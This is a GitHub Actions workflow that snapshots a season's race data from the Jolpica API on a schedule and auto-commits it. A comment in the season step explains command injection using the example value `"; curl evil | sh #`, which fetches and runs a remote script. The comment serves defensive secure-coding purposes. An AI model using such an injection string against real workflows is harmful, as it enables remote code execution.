name: Snapshot season data

# Runs manually (any season) or weekly on a schedule (the current season,
# so completed race weekends get committed to the repo automatically — a
# resilience net in case the community-run Jolpica API has downtime, not
# just a one-off for past seasons). Re-running it just refreshes that
# season's file, so a second run on the same day that finds nothing new
# is a harmless no-op commit-wise (git-auto-commit-action only commits
# when the file actually changed).
#
# Two scheduled runs each Monday: 10:00 UTC and a catch-up at 18:00 UTC,
# in case the source API hasn't published a race weekend's results yet
# by the morning run.
on:
  workflow_dispatch:
    inputs:
      season:
        description: "Season year to snapshot (e.g. 2023). Leave blank to snapshot the current season."
        required: false
        type: string
  schedule:
    - cron: "0 10 * * 1"
    - cron: "0 18 * * 1"

permissions:
  contents: write

jobs:
  snapshot:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Determine season
        id: season
        env:
          # Passed as an env var rather than interpolated into the script
          # text directly — workflow_dispatch input is attacker-controlled
          # by anyone who can trigger the workflow, and a value like
          # `"; curl evil | sh #` interpolated straight into `run:` would
          # execute as shell before this step's own logic runs at all.
          SEASON_INPUT: ${{ inputs.season }}
        run: |
          SEASON="$SEASON_INPUT"
          if [ -z "$SEASON" ]; then
            SEASON=$(date +%Y)
          fi
          echo "season=$SEASON" >> "$GITHUB_OUTPUT"

      - name: Fetch season snapshot
        env:
          SEASON: ${{ steps.season.outputs.season }}
        run: node scripts/snapshot-season.mjs "$SEASON"

      - name: Commit snapshot
        uses: stefanzweifel/git-auto-commit-action@v5
        with:
          commit_message: "Add ${{ steps.season.outputs.season }} season snapshot"
          file_pattern: data/seasons/*.json
